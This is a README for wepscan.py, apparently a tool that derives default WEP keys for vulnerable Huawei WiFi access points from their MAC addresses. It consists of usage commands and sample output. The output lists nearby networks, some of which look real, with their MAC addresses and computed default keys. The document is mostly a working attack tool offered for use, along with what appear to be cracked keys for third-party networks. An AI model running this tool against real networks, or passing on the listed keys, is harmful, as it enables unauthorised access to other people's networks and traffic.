# wepscan.py

[![Join the chat at https://gitter.im/ksaver/wepscan](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/ksaver/wepscan?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
Scan WiFi networks and show up default WEP keys for vulnerable Huawei access points.

##Usage:

###View arguments:
```bash
$ ./wepscan.py -h
usage: wepscan.py [-h] [-m MACADDRESS] [-i INTERFACE]

optional arguments:
  -h, --help            show this help message and exit
  -m MACADDRESS, --mac-address MACADDRESS
                        Mac address to wep key (formerly mac2wep).
  -i INTERFACE, --interface INTERFACE
                        WiFi interface to perform scanning.
```

###Get the default WEP key for a single MAC address:
```bash
$ ./wepscan.py -m 5C:4C:A9:30:FF:4C 
[+] SUFFIX: c5eb, DEFAULT WEP KEY: 6434386463
```

###Scan WiFi networks with normal user priviledges:
```bash
$ ./wepscan.py -i wlan0
 + -- + ------------------ + ------------------ + ------ + ------ + ------------ +
 |    | NETWORK            | ADDRESS            | SIGNAL | SUFFIX | DEFAULT KEY  |
 + -- + ------------------ + ------------------ + ------ + ------ + ------------ +
 |  1 | SKYNET             | 00:11:22:33:AA:FF  | 24/70  |        |              |
 + -- + ------------------ + ------------------ + ------ + ------ + ------------ +
```

###Scan WiFi networks with sudo or root priviledges:
```bash
$ sudo ./wepscan.py -i wlan0
[...]
 + --- + ------------------ + ------------------ + -------- + ------ + ------------ +
 |     | NETWORK            | ADDRESS            | QUALITY  | SUFFIX | DEFAULT KEY  |
 + --- + ------------------ + ------------------ + -------- + ------ + ------------ +
 |   1 | INFINITUMc5eb      | 5C:4C:A9:30:FF:4C  | 25/70    | c5eb   | 6434386463   |
 |   2 | INFINITUM2beb      | 64:16:F0:D0:3C:C0  | 17/70    | 2beb   | 3663383065   |
 |   3 | INFINITUM95da      | 00:25:68:23:28:0C  | 21/70    | 95da   | 6431346462   |
 |   4 | AXTEL XTREMO-33DD  | 00:02:71:35:33:DE  | 25/70    |        |              |
 |   5 | AXTEL-XTREMO-9572  | 14:D6:4D:E4:95:72  | 19/70    |        |              |
 |   6 | ARRIS-2942         | 20:73:55:49:29:40  | 21/70    |        |              |
 |   7 | Huawei-HG8245H-FC2 | AC:85:3D:FA:16:0C  | 21/70    |        |              |
 |   8 | Huawei-HG8245H-042 | 04:F9:38:36:47:14  | 19/70    |        |              |
 |   9 | INFINITUM81672B    | A4:B1:E9:81:67:2B  | 19/70    |        |              |
 |  10 | INFINITUME75B0E    | A4:B1:E9:E7:5B:0E  | 19/70    |        |              |
 |  11 | ARRIS-BC72         | CC:A4:62:A3:BC:70  | 25/70    |        |              |
[...]
```
